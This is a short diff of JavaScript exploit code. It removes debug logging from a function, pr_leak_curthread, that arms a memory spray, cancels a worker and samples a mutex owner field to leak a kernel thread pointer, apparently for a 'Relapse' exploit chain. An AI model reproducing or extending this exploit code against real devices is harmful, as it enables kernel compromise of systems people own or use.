@@ -875,8 +875,7 @@ async function pr_leak_curthread() {
   pr_counter_reset(pr_n0_sink);
   pr_set_node0(chain.addr, ctr.add(0x10));
   if (pr_preset_node0_dec() !== 0) throw new Error('Unable to preset Relapse node0 !!');
-  const sprayed = pr_arm_once();
-  logger.debug(`Relapse leak armed: sprayed=${sprayed}, chain=${chain.addr} !!`);
+  pr_arm_once();
 
   // Warm the owner cache line.
   let warm = 0;
@@ -885,9 +884,7 @@ async function pr_leak_curthread() {
     warm ^= pr_mutex_u32[PR_OWNER_LO];
   }
 
-  logger.debug('Relapse leak firing worker cancel !!');
   const pending = pr_worker_cancel(0, pr_arm_ids, 1, pr_arm_status);
-  logger.debug('Relapse leak cancel posted, sampling owner !!');
   const samples = new Map();
   let hit_lo = 0;
   let hit_hi = 0;
